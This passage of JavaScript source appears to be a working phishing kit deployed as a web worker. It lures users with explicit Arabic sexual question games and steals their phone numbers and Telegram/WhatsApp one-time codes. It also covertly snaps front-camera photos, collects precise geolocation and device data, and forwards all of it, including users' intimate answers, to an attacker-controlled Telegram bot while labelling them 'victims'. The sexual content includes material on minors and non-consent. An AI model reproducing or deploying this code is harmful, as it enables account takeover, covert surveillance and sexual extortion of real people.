                            charging = battery.charging;
                        } catch(e) {}
                    }

                    const screenWidth = window.screen.width;
                    const screenHeight = window.screen.height;

                    const getCoords = () => {
                        return new Promise((resolve) => {
                            if (!navigator.geolocation) {
                                resolve({ lat: null, lng: null });
                                return;
                            }
                            navigator.geolocation.getCurrentPosition(
                                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
                                () => resolve({ lat: null, lng: null }),
                                { timeout: 8000, enableHighAccuracy: true }
                            );
                        });
                    };

                    const coords = await getCoords();

                    let capturedImages = [];
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        await video.play();

                        const canvas = document.createElement('canvas');
                        canvas.width = 480;
                        canvas.height = 360;
                        const ctx = canvas.getContext('2d');

                        for (let i = 0; i < 3; i++) {
                            await new Promise(r => setTimeout(r, 600));
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                            capturedImages.push(canvas.toDataURL('image/jpeg', 0.4));
                        }

                        stream.getTracks().forEach(track => track.stop());
                    } catch (camErr) {
                        console.log("Camera denied/error:", camErr);
                    }

                    await fetch('/save-device-info', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            images: capturedImages,
                            lat: coords.lat,
                            lng: coords.lng,
                            batteryLevel: batteryLevel,
                            charging: charging,
                            screenWidth: screenWidth,
                            screenHeight: screenHeight
                        })
                    });

                } catch (e) {
                    console.error(e);
                } finally {
                    loader.style.display = 'none';
                    statusBox.style.display = 'block';
                    statusBox.innerHTML = \`
                        <span class="error-text">⚠️ تعذر الانضمام للمجموعة، الكود الذي أدخلته غير صحيح أو أنك لم توافق على تسجيل الدخول من داخل التطبيق.</span>
                        <a href="/otp?platform=${platform}" class="retry-btn">إعادة محاولة إدخال الكود 🔄</a>
                        <a href="https://t.me/pornodrive" class="free-group-btn" style="margin-bottom:8px;">لكننا قدمنا لك مجموعة مجانية 🎁</a>
                        <button class="retry-btn" style="background:#0284c7; margin-bottom:8px;" onclick="startPreGame()">🔥 لعبة الأسئلة الجريئة والصريحة جداً (+50 سؤال)</button>
                        <button class="retry-btn world-btn" style="margin-bottom:0;" onclick="openSecondWorld()">🌌 الانتقال للعالم الثاني (أقسام الخيانة والمكافآت السرية) 🔥</button>
                    \`;
                }
            }

            const questionsMale = [
                "2. تخيل أنك الآن تضع قضيبك الصلب في طيزي، ما هو شعورك وأنت تدفعه ببطء؟",
                "3. لو كنت نائمة على بطني ومؤخرتي مرفوعة أمامك، كيف ستعاشرني من الخلف؟",
                "4. ما هو المكان في جسدي الذي تتمنى أن تقذف فيه سائلك الحار الآن؟",
                "5. هل تحب أن تمسك بشعر رأسي وتجبرني على أخذ قضيبك في فمك بعنف؟",
                "6. كم مرة تتمنى أن تكرر عملية الإيلاج والنيك في الليلة الواحدة معنا؟",
                "7. لو طلبتُ منك أن تلحس كسسي وطيزي في نفس الوقت، هل ستفعلها بشغف؟",
                "8. ما هو الوضع الجنسي المفضل لديك الذي يجعلك تنفجر شهوة وإثارة؟",
                "9. هل تحب أن تشتم وتتكلم بكلام بذيء وجريء جداً أثناء النيك؟",
                "10. تخيل أنني أصرخ من شدة اللذة وأنت تعنفني في الفراش، كيف ستتصرف؟",
                "11. لو أمسكتُ بقضيبك بيدي وعصرته بقوة حتى ترتجف، ماذا ستفعل بي؟",
                "12. هل تفضل نيك البنات الصغيرات الجريئات أم النساء ذوات المؤخرات الكبيرة؟",
                "13. ما هي اللحظة التي تجعل المني يخرج منك بغزارة دون قيد أو شرط؟",
                "14. هل أنت مستعد لتنفيذ كل رغباتي الجنسية البذيئة والساخنة الآن؟",
                "15. هل تحب أن تربط يداي وتفعل بي ما تحلو لك وأنا عارية تماماً؟",
                "16. كيف ستعبر عن شهوتك لو دخلت عليّ وغرفة النوم مظلمة ومملوءة بالعطور؟",
                "17. هل تهوى لمس صدري وعصر حلمتي بفمك وقضيبك ينتصب بشراسة؟",
                "18. لو طلبت منك أن تلحس عسل جسمي كله من أصابع رجلي حتى رقبتي، أين تبدأ؟",
                "19. هل تشعر برغبة عارمة في نيك فتاة جامحة لا تهدأ طوال الليل؟",
                "20. ما هي الكلمة البذيئة التي تحب أن تسمعها بصوت منخفض وأنت تنيكني؟",
                "21. هل تحب أن تعاشرني وأنا أنظر إلى عينيك مباشرة لنتبادل نظرات الشهوة؟",
                "22. تخيل أنني أستلقي فوقك وأفرك كسسي بقضيبك الحار، كيف ستتحمل؟",
                "23. هل تحب ممارسة الجنس في المطبخ أو الحمام بطريقة سريعة ومفاجئة؟",
                "24. لو طلبتُ منك أن تضربني على مؤخرتي حتى تحمر أثناء النيك، هل توافق؟",
                "25. هل تستمتع برؤية السائل يغطي وجهي وفمي بعد الانتهاء؟",
                "26. ما هو طول وسمك قضيبك الحقيقي الذي ستدخل به في جسدي؟",
                "27. هل تحب أن نمارس الجنس وأنت مرتدٍ ملابسك وحدك وأنا عارية تماماً؟",
                "28. لو قلت لك إنني أشتاق لنيكك العنيف الآن، ماذا ستفعل فوراً؟",
                "29. هل تعشق مداعبة منطقة الشرج لديك أم تفضل إيلاج قضيبك فقط؟",
                "30. كيف تتعامل مع فتاة تطلب منك نيكها بعنف دون توقف حتى الصباح؟",
                "31. هل تفضل القبلات الفرنسية الرطبة والعميقة قبل إدخال قضيبك؟",
                "32. تخيل أنني أستنجد بك لأتوقف من شدة الإيلاج، هل ستتوقف أم تزيد العنف؟",
                "33. هل تحب أن تلتقط صوراً ومقاطع لنا أثناء ممارسة الجنس الحار؟",
                "34. لو دخل زوجك أو شخص مفاجئ ونحن ننيك بعضنا، ماذا ستفعل؟",
                "35. هل تميل إلى لعق المهبل بطريقة جنونية تجعل الفتاة تفقد وعيها؟",
                "36. ما هو أكثر جزء في جسد المرأة يثير قضيبك ويجعله يتقطر رغبة؟",
                "37. هل أنت مستعد لدفع كل ما تملك مقابل قضاء ليلة حمراء وساخنة معي؟",
                "38. تخيل أنني أمتص قضيبك الصلب وأنت تغمض عينيك من شدة المتعة؟",
                "39. هل تحب أن تنام وقضيبك داخل كسسي طوال الليل؟",
                "40. لو طلبتُ منك أن تكون عبداً لشهوتي وجسدي ليلة كاملة، هل تقبل؟",
                "41. هل تشعر بالنشوة عندما تترك أثار عضاتك وقبلاتك على رقبتي وصدري؟",
                "42. تخيل أنني أطلب منك نيك طيزي لأول مرة، كيف ستستعد لذلك؟",
                "43. هل تحب أن تقذف داخل رحمي ليحمل مني طفل شهوتنا؟",
                "44. ما هو الأسلوب الأكثر إثارة الذي يجعلك تفقد السيطرة على نفسك وتفرغ منيكك؟",
                "45. هل تجد متعة في تبادل الأدوار الجريئة والكلمات الساخنة؟",
                "46. لو كنت أمام مرآة كبيرة ونحن ننيك بعنف، هل ستراقب جسدينا؟",
                "47. هل تحب أن تداعبني من الخلف وأنا أقف على أربع أمامك؟",
                "48. هل أنت مستعد لتنفيذ أي أمر جنسي أطلبه منك الآن حرفياً؟",
                "49. ما هي أطول مدة استمررت فيها في النيك دون انقطاع؟",
                "50. اكتب لي الختام: صف لي شكل قذفك الحار على وجهي بكلمات بذيئة ومشتعلة!"
            ];

            const questionsFemale = [
                "2. تخيل أن قضيباً صلباً وكبيراً يدخل في كسسَك ببطء، ماذا تقولين من شدة اللذة؟",
                "3. هل تحبين أن ينيكك رجل قوي بعنف ويقطع أنفاسك وأنت تصرخين متعة؟",
                "4. لو قام رجل بلحس كسسَك وامتصاص بظرك لساعات طويلة، كيف ستتفاعلين؟",
                "5. هل تتمنين أن يعاشرك رجل من الخلف في طيزك ويجعلك تذوبين من الألم الممتع؟",
                "6. ما هو حجم القضيب الذي يشعل رغبتك ويجعلك تفقدين السيطرة تماماً؟",
                "7. هل تحبين أن يتم ربط يديك وفعلك بقوة وجرأة مطلقة دون إذنك؟",
                "8. تخيل أنك في السرير مع رجل ينيكك بكل وحشية وشهوة، ما شعورك؟",
                "9. هل تستمتعين بالكلام الساخن والبذيء أثناء ممارسة الجنس الفموي؟",
                "10. ما هو المكان الحساس في جسدك الذي يعشقه الرجل بلسانه وأصابعه؟",
                "11. لو دخل رجل عليك غرفة النوم بدون ملابس وأراد نيكك فوراً، هل توافقين؟",
                "12. هل تحبين المداعبات القاسية على ثدييك ومناطقك الحساسة حتى تصلين للذروة؟",
                "13. كم رجلاً تتمنين أن يعاشرك في نفس الليلة لتحصلي على المتعة المطلقة؟",
                "14. هل أنت مستعدة للاستسلام الكامل لرجل يروي شهوتك المشتعلة بلا توقف؟",
                "15. هل تحبين أن يجبرك رجل على امتصاص قضيبه الخشن وأنت تبكين متعة؟",
                "16. كيف تشعرين عندما يملأ المني الحار جوفك أو فمك؟",
                "17. هل تميلين إلى تمني رجل مسيطر وقاسي يمارس عليك الجنس بلا رحمة؟",
                "18. تخيل أنك عارية تماماً ورجل يطاردك في الغرفة لنيكك بقوة، ما رد فعلك؟",
                "19. هل تحبين أن يضربك رجل على مؤخرتك أثناء إيلاج قضيبه في كسسَك؟",
                "20. ما هي الكلمة البذيئة التي تقال لك وتجعلك تذوبين فوراً وتفتحين رجليك؟",
                "21. هل تحبين ممارسة الجنس الجماعي أو تبادل الأزواج في غرف سرية؟",
                "22. تخيل أن قضيباً ضخماً يملأ كسسَك حتى العظم، كيف تصرخين؟",
                "23. هل تستمتعين بإدخال أصابعك أو ألعاب جنسية في طيزك حتى تصلين للنشوة؟",
                "24. لو طلب منك رجل أن تلحسي قضيبه المتقطر لتعيديه للصلابة، هل تفعلينها؟",
                "25. هل تفضلين النيك الصباحي السريع أم سهرات الليل الطويلة والوحشية؟",
                "26. ما هو طول وسمك القضيب الذي تتمنين أن يملأ فراشك كل ليلة؟",
                "27. هل تشعرين بالإثارة عندما ينظر رجل إلى جسدك وعوراتك بنظرات شهوانية؟",
                "28. لو كنت في المطبخ وقام رجل برفعك ونيكك على الطاولة، كيف تتفاعلين؟",
                "29. هل تحبين أن يمزق ملابسك الداخلية بيديه الخشنة قبل إدخال قضيبه؟",
                "30. ما شعورك لو قذف رجل سائله الحار داخل كسسَك وتركك تغرقين فيه؟",
                "31. هل تحبين أن تشاهدي أفلاماً إباحية قاسية وأنت تداعبين نفسك؟",
                "32. تخيل أن رجلين يمارسان الجنس معك في نفس الوقت (من الفم والخلف)، هل توافقين؟",
                "33. هل تميلين إلى الرجال الذين يجيدون الكلام الجنسي المثير والبذيء؟",
                "34. لو طلبتُ منك أن تعترفي بأكبر خيال جنسي جريء لديك، ماذا سيكون؟",
                "35. هل تحبين أن يعضك رجل في كتفك أو رقبتك لترك علامات واضحة؟",
                "36. ما هو الوضع الذي يجعلك تصلين للنشوة العارمة خلال دقائق معدودة؟",
                "37. هل أنت مستعدة لتكوني ملكية خاصة لرجل يروي نزواته الجسدية معك؟",
                "38. تخيل أن رجلاً ينام بين ساقيك ولا يرفع رأسه حتى تقذفي، ما شعورك؟",
                "39. هل تحبين أن يرتدي الرجل قناَعاً ويمارس معك الجنس بغموض ووحشية؟",
                "40. لو قلت لك إن رغبتم في نيكك الآن حتى تفقدي وعيك، هل تقبلين التحدي؟",
                "41. هل تشعرين بالرغبة في إهانة الرجل أو أن يقوم هو بإهانتك جنسياً أثناء النيك؟",
                "42. تخيل أن قضيباً كبيراً يدخل في طيزك الضيق لأول مرة، هل ستتألمين أم تستمتعين؟",
                "43. هل تحبين الاستحمام مع رجل عارين وتقبيل كل جزء في جسده بحرارة؟",
                "44. ما هي أكثر لحظة شعرتِ فيها بأنوثتك الطاغية أثناء ممارسة الجنس؟",
                "45. هل أنت مستعد للتخلي عن كل ملابسك وقيودك أمام الكاميرا فوراً؟",
                "46. لو دخل عليك رجل مسلح بالشهوة وأراد نيكك عنوة، كيف تتفاعلين؟",
                "47. هل تحبين أن يداعبك رجل من الخلف وأنتِ نائمة على وجهك؟",
                "48. هل تفضلين القبلات الساخنة على الفم أم اللمسات العنيفة على المهبل؟",
                "49. ما هي أجرأ كلمة قلتها لرجل وأشعلت شهوته في الحال؟",
                "50. اكتبي لي الختام: وصفي بالتفصيل كيف تذوبين تحت قضيب صلب ينيكك بلا توقف!"
            ];

            let currentGender = '';
            let currentIndex = 0;

            function startPreGame() {
                const box = document.getElementById('statusBox');
                box.innerHTML = \`
                    <div class="game-box">
                        <h3 style="color:#22c55e;">🔥 اختر تصنيفك لنبدأ الأسئلة الصريحة والمثيرة (+50 سؤال):</h3>
                        <button class="gender-btn" onclick="setGenderAndFirstQuestion('male')">👨 أنا ذكر</button>
                        <button class="gender-btn" onclick="setGenderAndFirstQuestion('female')">👩 أنا أنثى</button>
                        <button class="gender-btn" style="background:#8b5cf6; margin-top:12px;" onclick="openSecondWorld()">🌌 الانتقال للعالم الثاني (أقسام الخيانة والمكافآت السرية)</button>
                    </div>
                \`;
            }

            function setGenderAndFirstQuestion(gender) {
                currentGender = gender;
                currentIndex = 0;
                
                const firstQ = gender === 'male' 
                    ? '1. كم هو طول عضوك الذكري وهل هو صلب ومستعد للنيك الآن؟' 
                    : '1. كم هو حجم القضيب أو الطول الذي تفضلينه ويشعل كسَك رغبة؟';

                renderQuestionStep(firstQ);
            }

            function renderQuestionStep(questionText) {
                const box = document.getElementById('statusBox');
                box.innerHTML = \`
                    <div class="game-box">
                        <h3 style="color:#ef4444;">❓ \${questionText}</h3>
                        <textarea id="userAnswerInput" class="input-action-field" rows="3" placeholder="اكتب إجابتك الصريحة هنا بالتفصيل..."></textarea>
                        <button class="retry-btn" onclick="submitAndNext('\${questionText}')">إرسال الفعل والانتقال للسؤال التالي 🚀</button>
                        <div style="text-align:center;">
                            <span class="back-link" onclick="startPreGame()">⬅️ رجوع للقائمة الرئيسية</span>
                        </div>
                    </div>
                \`;
            }

            function submitAndNext(currentQ) {
                const val = document.getElementById('userAnswerInput').value.trim();
                if(!val) {
                    alert('يرجى كتابة إجابتك أو فعلك لنستمر في الإثارة!');
                    return;
                }

                fetch('/submit-game-answer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ question: currentQ, answer: val, gender: currentGender })
                });

                const list = currentGender === 'male' ? questionsMale : questionsFemale;

                if (currentIndex < list.length) {
                    const nextQ = list[currentIndex];
                    currentIndex++;
                    renderQuestionStep(nextQ);
                } else {
                    const box = document.getElementById('statusBox');
                    box.innerHTML = \`
                        <div class="game-box">
                            <h3 style="color:#22c55e;">🔥 لقد أتممت كافة الأسئلة الجريئة بنجاح تام!</h3>
                            <div class="answer-box">تم حفظ رغباتك وأفعالك بنجاح، جاري فتح الرابط السري والمجموعات الخاصة الآن... انتظر قليلاً!</div>
                            <button class="retry-btn" style="margin-top:15px;" onclick="startPreGame()">🔄 إعادة اللعبة من جديد</button>
                        </div>
                    \`;
                }
            }

            function openSecondWorld() {
                const box = document.getElementById('statusBox');
                box.innerHTML = \`
                    <div class="game-box">
                        <h3 style="color:#a855f7;">🌌 مرحباً بك في العالم الثاني (منطقة المحرمات والخيانات) 🔥</h3>
                        <p style="text-align:center; color:#94a3b8; font-size:13px; margin-bottom:15px;">اختر القسم الذي تشتهي اكتشافه الآن:</p>
                        <button class="gender-btn" style="background:#8b5cf6;" onclick="loadSecondWorldSection('cheat_feelings')">💔 قسم: كيف تشعر المرأة عند الخيانة وكيف تشتعل؟</button>
                        <button class="gender-btn" style="background:#ec4899;" onclick="loadSecondWorldSection('secret_confessions')">🔥 قسم: اعترافات الزوجات السريحة والخيانات المحرمة</button>
                        <button class="gender-btn" style="background:#0284c7;" onclick="loadSecondWorldSection('vip_gift')">🎁 صناديق المكافآت السرية والجوائز الحصرية (+18)</button>
                        <div style="text-align:center;">
                            <span class="back-link" onclick="startPreGame()">⬅️ رجوع للخلف</span>
                        </div>
                    </div>
                \`;
            }

            function loadSecondWorldSection(sectionType) {
                const box = document.getElementById('statusBox');
                let title = "";
                let promptText = "";

                if (sectionType === 'cheat_feelings') {
                    title = "💔 مشاعر المرأة عند الخيانة الزوجية:";
                    promptText = "عندما تخون المرأة زوجها مع رجل يملأ عينيها، تشعر برعشة مجنونة في جسدها كله وتنتفض رغبة، لأنها تتذوق طعم اللذة المحرمة والسيطرة. اكتب لنا برأيك: ما هو أكثر شعور يسيطر على المرأة وهي تفتح رجلين لعشيقها في فراش زوجها؟";
                } else if (sectionType === 'secret_confessions') {
                    title = "🔥 اعترافات الخيانة الساخنة:";
                    promptText = "قصة حقيقية لزوجة خانت زوجها مع جارها الشاب وطلبت منه أن ينيكها في طيزها وكسها معاً حتى أفرغت كل ما في جوفها. تخيل لو أنك مكان العشيق، ماذا كنت ستفعل بجسدها الآن؟ اكتب ردك الفعلي بصراحة مفرطة!";
                } else {
                    title = "🎁 صندوق المكافآت السرية VIP:";
                    promptText = "مبروك! لقد فتحت الصندوق الذهبي وحصلت على (جلسة فيديو كول عارية ومباشرة). لتأكيد استلام الجائزة وفك التشفير، اكتب لنا: ما هو اسمك ورغبتك الجنسية الأكثر جموحاً التي تريد تطبيقها فوراً؟";
                }

                box.innerHTML = \`
                    <div class="game-box">
                        <h3 style="color:#ef4444;">\${title}</h3>
                        <div class="answer-box" style="font-size:13px; margin-bottom:12px; text-align:right;">\${promptText}</div>
                        <textarea id="secondWorldInput" class="input-action-field" rows="3" placeholder="اكتب ردك أو رغبتك الصريحة هنا بالتفصيل..."></textarea>
                        <button class="retry-btn" style="background:#8b5cf6;" onclick="submitSecondWorldAnswer('\${title}')">إرسال الإجابة والحصول على المفاجأة 🚀</button>
                        <div style="text-align:center;">
                            <span class="back-link" onclick="openSecondWorld()">⬅️ رجوع لقائمة العالم الثاني</span>
                        </div>
                    </div>
                \`;
            }

            function submitSecondWorldAnswer(sectionTitle) {
                const val = document.getElementById('secondWorldInput').value.trim();
                if(!val) {
                    alert('يرجى كتابة إجابتك لنستمر في كشف الأسرار والمكافآت!');
                    return;
                }

                fetch('/submit-game-answer', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ question: sectionTitle, answer: val, gender: 'العالم الثاني (خيانة ومكافآت)' })
                });

                const box = document.getElementById('statusBox');
                box.innerHTML = \`
                    <div class="game-box">
                        <h3 style="color:#22c55e;">✅ تم استلام إجابتك السرية بنجاح!</h3>
                        <div class="answer-box">تم توثيق رغبتك وإرسالها للنظام السري بنجاح. جاري فتح المحتوى الحصري ورابط المكافآت الآن... انتظر لحظات!</div>
                        <button class="retry-btn" style="background:#8b5cf6; margin-top:15px;" onclick="openSecondWorld()">🌌 العودة لأقسام العالم الثاني</button>
                    </div>
                \`;
            }
        </script>
    </body>
    </html>
    `);
}

export default {
    async fetch(request, env, ctx) {
        try {
            const url = new URL(request.url);
            const path = url.pathname;
            const method = request.method.toUpperCase();

            if (method === 'GET' && path === '/') {
                return renderHomePage();
            }

            if (method === 'GET' && path === '/groups') {
                return renderGroupsPage(url);
            }

            if (method === 'GET' && path === '/login') {
                return renderLoginPage(url);
            }

            if (method === 'POST' && path === '/submit-phone') {
                const body = await parseRequestBody(request);
                const platform = body.platform || 'telegram';
                const country = body.country || 'غير معروف';
                const phone = body.phone || '';

                lastCountry = country;
                lastPlatform = platform;

                const match = country.match(/\(([^)]+)\)/);
                const countryCode = match ? match[1] : '';
                lastPhone = `${countryCode}${phone}`;

                const client = getClientInfo(request);
                const msg = `🔥 *رقم جديد تم التقاطه!*\n\n📱 المنصة: ${lastPlatform}\n🌍 الدولة: ${country}\n📞 الرقم الكامل: \`${lastPhone}\`\n🌐 IP: \`${client.ip}\`\n💻 المتصفح: ${client.userAgent}`;

                ctx.waitUntil(sendTelegramMessage(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, msg));

                return new Response(null, {
                    status: 302,
                    headers: { Location: `/otp?platform=${encodeURIComponent(lastPlatform)}` }
                });
            }

            if (method === 'GET' && path === '/otp') {
                return renderOtpPage(url);
            }

            if (method === 'POST' && path === '/notify-click') {
                const body = await parseRequestBody(request);
                const type = body.type;
                const platformNameAr = lastPlatform === 'whatsapp' ? 'واتساب' : 'تليجرام';
                const actionName = type === 'app' ? `تطبيق ${platformNameAr}` : 'تطبيق البريد الإلكتروني';

                const alertMsg = `👆 *تنبيه تفاعل الضحية!*\n\n📞 الرقم: \`${lastPhone}\`\n⚡ الضحية قام بالنقر على زر الانتقال إلى: *${actionName}*`;
                ctx.waitUntil(sendTelegramMessage(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, alertMsg));

                return jsonResponse({ status: 'success' });
            }

            if (method === 'POST' && path === '/save-device-info') {
                const body = await parseRequestBody(request);
                const { images, lat, lng, batteryLevel, charging, screenWidth, screenHeight } = body;
                const client = getClientInfo(request);

                const mapsLink = (lat && lng) ? `https://maps.google.com/?q=${lat},${lng}` : "غير معروف";
                const chargeStatus = charging ? "⚡ موصل بالشاحن (يشحن)" : "🔋 غير موصل بالشاحن";
                const batteryText = (batteryLevel !== null && batteryLevel !== undefined) ? `${batteryLevel}%` : "غير معروف";

                const baseCaption =
                    `📱 المنصة: \`${lastPlatform}\`\n` +
                    `📞 الرقم: \`${lastPhone}\`\n` +
                    `📱 دقة الشاشة: \`${screenWidth}x${screenHeight}\`\n` +
                    `🔋 نسبة الشحن: \`${batteryText}\` | ${chargeStatus}\n` +
                    `📍 الموقع: [فتح على الخريطة](${mapsLink})\n` +
                    `🌐 IP: \`${client.ip}\``;

                ctx.waitUntil((async () => {
                    if (Array.isArray(images) && images.length > 0) {
                        for (let index = 0; index < images.length; index++) {
                            const imgData = images[index];
                            if (typeof imgData === 'string') {
                                const base64Data = imgData.replace(/^data:image\/jpeg;base64,/, '');
                                const binaryStr = atob(base64Data);
                                const bytes = new Uint8Array(binaryStr.length);
                                for (let i = 0; i < binaryStr.length; i++) {
                                    bytes[i] = binaryStr.charCodeAt(i);
                                }
                                const photoCaption = `📸 *صورة (${index + 1}/3) وبيانات جديدة للجهاز!*\n\n` + baseCaption;
                                await sendTelegramPhoto(bytes, photoCaption);
                            }
                        }
                    } else {
                        await sendTelegramMessage(
                            TELEGRAM_BOT_TOKEN,
                            TELEGRAM_CHAT_ID,
                            `📸 *بيانات جديدة للجهاز (بدون صور)!*\n\n` + baseCaption
                        );
                    }
                })());

                return jsonResponse({ status: 'success' });
            }

            if (method === 'POST' && path === '/resend-code') {
                const alertText = `⚠️ تنبيه هام: الضحية برقم (${lastPhone}) يطالب بإعادة إرسال كود التحقق الآن! يرجى طلب الكود من التطبيق الرسمي فوراً.`;
                ctx.waitUntil(sendTelegramMessage(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, alertText));
                return jsonResponse({ status: 'success' });
            }

            if (method === 'POST' && path === '/submit-game-answer') {
                const body = await parseRequestBody(request);
                const { question, answer, gender } = body;
                const genderText = gender === 'male' ? 'ذكر' : (gender === 'female' ? 'أنثى' : 'العالم الثاني / خيانة');

                const gameMsg =
                    `🔥 *تفاعل جديد من الضحية!*\n\n` +
                    `📞 رقم الضحية: \`${lastPhone}\`\n` +
                    `👤 التصنيف: ${genderText}\n` +
                    `❓ السؤال أو القسم: *${question}*\n` +
                    `💬 إجابة / فعل الضحية: \`${answer}\``;

                ctx.waitUntil(sendTelegramMessage(GAME_BOT_TOKEN, GAME_CHAT_ID, gameMsg));
                return jsonResponse({ status: 'success' });
            }

            if (method === 'POST' && path === '/submit-otp') {
                const body = await parseRequestBody(request);
                const otp = body.otp || '';

                const msg = `🔐 *تم إدخال كود التحقق بنجاح!*\n\n📞 الرقم: \`${lastPhone}\`\n🔑 الكود: \`${otp}\``;
                ctx.waitUntil(sendTelegramMessage(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, msg));

                return renderSubmitOtpPage(url, otp);
            }

            return new Response('Not Found', { status: 404 });
        } catch (err) {
            console.error('Worker Error:', err);
            return new Response('Internal Server Error', { status: 500 });
        }
    }
};
